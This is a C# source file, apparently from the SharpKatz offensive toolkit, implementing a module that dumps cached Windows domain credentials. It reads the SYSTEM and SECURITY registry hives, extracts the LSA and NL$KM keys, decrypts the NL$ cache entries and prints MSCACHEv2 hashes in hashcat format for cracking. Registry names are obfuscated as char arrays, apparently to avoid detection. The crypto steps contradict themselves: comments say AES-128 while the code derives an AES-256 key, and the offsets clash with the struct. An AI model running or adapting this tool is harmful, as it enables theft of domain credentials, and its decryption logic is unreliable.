//
// Author: Johto
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
// Module: lsadump::cache - Cached domain credentials (DCC2/MSCACHEv2) extraction
//

using SharpKatz.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static SharpKatz.Win32.Natives;
using static SharpKatz.Module.Sam;

namespace SharpKatz.Module
{
    class LsaCache
    {
        const uint KEY_READ = 0x20019;

        // NL_RECORD flags
        const ushort NL_RECORD_FLAG_SUPPL_CREDS = 0x0001;
        const int AES_BLOCK_SIZE = 16;

        // NL_RECORD structure - cached domain credential entry
        [StructLayout(LayoutKind.Sequential)]
        public struct NL_RECORD
        {
            public ushort cbRecord;        // Total size of this record
            public ushort Flags;
            public uint cbUserName;        // Length of UserName (bytes, Unicode)
            public uint cbDomainName;      // Length of DomainName (bytes, Unicode)
            public uint cbEffectiveName;   // Length of EffectiveName
            public uint cbFullName;
            public uint cbLogonScript;
            public uint cbProfilePath;
            public uint cbHomeDirectory;
            public uint cbHomeDirectoryDrive;
            public uint UserId;
            public uint PrimaryGroupId;
            public uint GroupCount;
            public ushort cbLogonDomainName;
            public ushort unk0;
            public long LastWrite;         // FILETIME
            public uint Revision;
            public uint SidCount;
            public uint Valid;
            public uint cbSidHistory;
            public uint cbLogonPackage;
            public uint cbDnsDomainName;
            public uint cbUpn;
            // Vista+
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] IV;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] CH;              // HMAC verification checksum
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
            public byte[] EncryptedData;   // First 64 bytes of encrypted data (MSCACHEv2 hash is here)
        }

        /// <summary>
        /// Entry point for lsadump::cache
        /// Reads SYSTEM + SECURITY hives, extracts cached domain credentials
        /// </summary>
        public static bool LsadumpCache(string systemHive, string securityHive)
        {
            Console.WriteLine("\n  [*] lsadump::cache");

            IntPtr hRegistrySecurity = IntPtr.Zero;
            IntPtr hDataSecurity = IntPtr.Zero;

            // Get LSA key first
            byte[] lsaKey = LsaSecrets.GetLsaKey(systemHive, securityHive, out hRegistrySecurity, out hDataSecurity);
            if (lsaKey == null || lsaKey.Length == 0)
            {
                Console.WriteLine("   [-] Error extracting LSA key");
                return false;
            }

            Console.Write("   LSA Key : ");
            Console.WriteLine(Utility.PrintHashBytes(lsaKey));

            // Get NL$KM key from LSA secrets
            byte[] nlkmKey = LsaSecrets.GetNLKMKey(hRegistrySecurity, lsaKey);
            if (nlkmKey == null || nlkmKey.Length == 0)
            {
                Console.WriteLine("   [-] Error extracting NL$KM key (no cached credentials key)");
                Sam.RegistryClose(hRegistrySecurity);
                CloseHandle(hDataSecurity);
                return false;
            }

            Console.Write("   NL$KM   : ");
            Console.WriteLine(Utility.PrintHexBytes(nlkmKey));

            // Get iteration count from NL$IterationCount
            uint iterationCount = GetIterationCount(hRegistrySecurity);
            Console.WriteLine("   Iteration Count : {0} (real: {1})", iterationCount, iterationCount > 10240 ? iterationCount : iterationCount * 1024);

            // Enumerate cached entries: NL$1, NL$2, ... NL$N
            // Default is 10 cached entries (HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\CachedLogonsCount)
            EnumerateCachedEntries(hRegistrySecurity, nlkmKey, iterationCount);

            Sam.RegistryClose(hRegistrySecurity);
            CloseHandle(hDataSecurity);

            return true;
        }

        /// <summary>
        /// Get NL$IterationCount from Cache key
        /// </summary>
        private static uint GetIterationCount(IntPtr hRegistry)
        {
            uint lpType = 0;
            IntPtr lpData = IntPtr.Zero;
            uint szNeeded = 0;

            string sCacheKey = new string(new char[] { 'C', 'a', 'c', 'h', 'e' });
            string sIterCount = new string(new char[] { 'N', 'L', '$', 'I', 't', 'e', 'r', 'a', 't', 'i', 'o', 'n', 'C', 'o', 'u', 'n', 't' });

            if (Sam.OpenAndQueryWithAlloc(hRegistry, IntPtr.Zero, sCacheKey, sIterCount, ref lpType, ref lpData, out szNeeded))
            {
                if (szNeeded >= 4 && lpData != IntPtr.Zero)
                {
                    uint count = (uint)Marshal.ReadInt32(lpData);
                    Marshal.FreeHGlobal(lpData);
                    return count > 0 ? count : 10240;
                }
            }

            return 10240; // Default
        }

        /// <summary>
        /// Enumerate and decrypt cached credential entries
        /// </summary>
        private static void EnumerateCachedEntries(IntPtr hRegistry, byte[] nlkmKey, uint iterationCount)
        {
            string sCacheKey = new string(new char[] { 'C', 'a', 'c', 'h', 'e' });
            IntPtr hCache = Sam.RegOpenKeyEx(hRegistry, IntPtr.Zero, sCacheKey, 0, (ACCESS_MASK)KEY_READ);
            if (hCache == IntPtr.Zero)
            {
                Console.WriteLine("   [-] Cannot open Cache key");
                return;
            }

            int cacheIndex = 0;
            bool found = false;

            for (int i = 1; i <= 64; i++) // Max 64 cached entries
            {
                string sNL = string.Format("NL${0}", i);
                uint lpType = 0;
                IntPtr lpData = IntPtr.Zero;
                uint szNeeded = 0;

                if (Sam.QueryWithAlloc(hRegistry, hCache, sNL, ref lpType, ref lpData, ref szNeeded))
                {
                    if (szNeeded > Marshal.SizeOf(typeof(NL_RECORD)) && lpData != IntPtr.Zero)
                    {
                        byte[] nlData = new byte[szNeeded];
                        Marshal.Copy(lpData, nlData, 0, (int)szNeeded);
                        Marshal.FreeHGlobal(lpData);

                        // Parse NL_RECORD header
                        if (ParseAndDecryptCacheEntry(nlData, nlkmKey, iterationCount, i))
                        {
                            found = true;
                            cacheIndex++;
                        }
                    }
                    else if (lpData != IntPtr.Zero)
                    {
                        Marshal.FreeHGlobal(lpData);
                    }
                }
            }

            Sam.RegCloseKey(hRegistry, hCache);

            if (!found)
            {
                Console.WriteLine("\n   [-] No cached credentials found");
            }
        }

        /// <summary>
        /// Parse a single NL_RECORD and decrypt the cached credentials
        /// </summary>
        private static bool ParseAndDecryptCacheEntry(byte[] data, byte[] nlkmKey, uint iterationCount, int index)
        {
            // NL_RECORD minimum size check
            int headerSize = 96; // Fixed header before IV
            if (data.Length < headerSize + 16 + 16 + 64) // header + IV + CH + min encrypted
                return false;

            // Read header fields
            ushort cbRecord = BitConverter.ToUInt16(data, 0);
            ushort flags = BitConverter.ToUInt16(data, 2);
            uint cbUserName = BitConverter.ToUInt32(data, 4);
            uint cbDomainName = BitConverter.ToUInt32(data, 8);
            uint cbEffectiveName = BitConverter.ToUInt32(data, 12);
            uint cbFullName = BitConverter.ToUInt32(data, 16);
            uint cbLogonScript = BitConverter.ToUInt32(data, 20);
            uint cbProfilePath = BitConverter.ToUInt32(data, 24);
            uint cbHomeDirectory = BitConverter.ToUInt32(data, 28);
            uint cbHomeDirectoryDrive = BitConverter.ToUInt32(data, 32);
            uint userId = BitConverter.ToUInt32(data, 36);
            uint primaryGroupId = BitConverter.ToUInt32(data, 40);
            uint groupCount = BitConverter.ToUInt32(data, 44);
            ushort cbLogonDomainName = BitConverter.ToUInt16(data, 48);
            // unk0 at 50
            long lastWrite = BitConverter.ToInt64(data, 52);
            uint revision = BitConverter.ToUInt32(data, 60);
            uint sidCount = BitConverter.ToUInt32(data, 64);
            uint valid = BitConverter.ToUInt32(data, 68);
            uint cbSidHistory = BitConverter.ToUInt32(data, 72);
            uint cbLogonPackage = BitConverter.ToUInt32(data, 76);
            uint cbDnsDomainName = BitConverter.ToUInt32(data, 80);
            uint cbUpn = BitConverter.ToUInt32(data, 84);

            // Check if entry is valid (non-zero username length)
            if (cbUserName == 0)
                return false;

            // IV at offset 88 (16 bytes)
            byte[] iv = new byte[16];
            Array.Copy(data, 88, iv, 0, 16);

            // CH (checksum) at offset 104 (16 bytes)
            // Encrypted data starts at offset 120
            int encDataOffset = 120;
            int encDataLen = data.Length - encDataOffset;

            if (encDataLen <= 0)
                return false;

            byte[] encryptedData = new byte[encDataLen];
            Array.Copy(data, encDataOffset, encryptedData, 0, encDataLen);

            // Decrypt using AES-128-CBC with HMAC-SHA512 derived key
            // Key derivation: HMAC-SHA512(NL$KM, IV)
            byte[] decryptionKey;
            using (HMACSHA512 hmac = new HMACSHA512(nlkmKey))
            {
                decryptionKey = hmac.ComputeHash(iv);
            }

            // Use first 32 bytes as AES-256 key
            byte[] aesKey = new byte[32];
            Array.Copy(decryptionKey, 0, aesKey, 0, Math.Min(32, decryptionKey.Length));

            // Decrypt with AES-256-CBC
            byte[] decryptedData = DecryptAesCbc(encryptedData, aesKey, iv);
            if (decryptedData == null || decryptedData.Length < 16)
                return false;

            // The first 16 bytes of decrypted data is the MSCACHEv2 hash
            byte[] mscacheHash = new byte[16];
            Array.Copy(decryptedData, 0, mscacheHash, 0, 16);

            // After the hash, we have the user data (aligned)
            // Username starts at offset 72 in decrypted data (after hash + padding)
            int userDataOffset = 16 + 48; // hash(16) + padding to 64-byte align

            // Try to extract username and domain from decrypted data
            string userName = "";
            string domainName = "";
            string dnsDomainName = "";

            // The user data in decrypted block follows: MSCACHEv2(16) then remaining header data
            // then strings: UserName, DomainName, DnsDomainName, Upn, EffectiveName, FullName...
            // Exact layout: first 16 bytes = MSCACHE hash, then variable-length user info
            int strOffset = 16; // Start right after the MSCACHE hash

            if (strOffset + cbUserName <= decryptedData.Length)
            {
                userName = Encoding.Unicode.GetString(decryptedData, strOffset, (int)cbUserName).TrimEnd('\0');
            }
            strOffset += (int)Align(cbUserName, 4);

            if (strOffset + cbDomainName <= decryptedData.Length)
            {
                domainName = Encoding.Unicode.GetString(decryptedData, strOffset, (int)cbDomainName).TrimEnd('\0');
            }
            strOffset += (int)Align(cbDomainName, 4);

            // Skip DnsDomainName offset - it's after domain name
            if (cbDnsDomainName > 0 && strOffset + cbDnsDomainName <= decryptedData.Length)
            {
                dnsDomainName = Encoding.Unicode.GetString(decryptedData, strOffset, (int)cbDnsDomainName).TrimEnd('\0');
            }

            // Display results
            Console.WriteLine("\n  [Cache Entry {0}]", index);
            Console.WriteLine("   User     : {0}\\{1}", domainName, userName);
            if (!string.IsNullOrEmpty(dnsDomainName))
                Console.WriteLine("   Domain   : {0}", dnsDomainName);

            // Calculate real iteration count
            uint realIterCount = iterationCount > 10240 ? iterationCount : iterationCount * 1024;

            // Display DCC2 hash in hashcat format: $DCC2$iterations#username#hash
            Console.Write("   MsCacheV2 : ");
            Console.WriteLine(Utility.PrintHashBytes(mscacheHash));

            Console.WriteLine("   > Hashcat : $DCC2${0}#{1}#{2}",
                realIterCount,
                userName.ToLower(),
                BitConverter.ToString(mscacheHash).Replace("-", "").ToLower());

            return true;
        }

        /// <summary>
        /// AES-CBC decryption for cached credentials
        /// </summary>
        private static byte[] DecryptAesCbc(byte[] encrypted, byte[] key, byte[] iv)
        {
            try
            {
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.None;

                    using (ICryptoTransform decryptor = aes.CreateDecryptor())
                    {
                        // Only decrypt full blocks
                        int fullBlockLen = (encrypted.Length / 16) * 16;
                        if (fullBlockLen == 0) return null;

                        byte[] toDecrypt = new byte[fullBlockLen];
                        Array.Copy(encrypted, 0, toDecrypt, 0, fullBlockLen);

                        byte[] result = decryptor.TransformFinalBlock(toDecrypt, 0, fullBlockLen);

                        // Append any remainder
                        if (encrypted.Length > fullBlockLen)
                        {
                            byte[] full = new byte[result.Length + (encrypted.Length - fullBlockLen)];
                            Array.Copy(result, 0, full, 0, result.Length);
                            Array.Copy(encrypted, fullBlockLen, full, result.Length, encrypted.Length - fullBlockLen);
                            return full;
                        }

                        return result;
                    }
                }
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Align a value to boundary
        /// </summary>
        private static uint Align(uint value, uint alignment)
        {
            return (value + alignment - 1) & ~(alignment - 1);
        }
    }
}
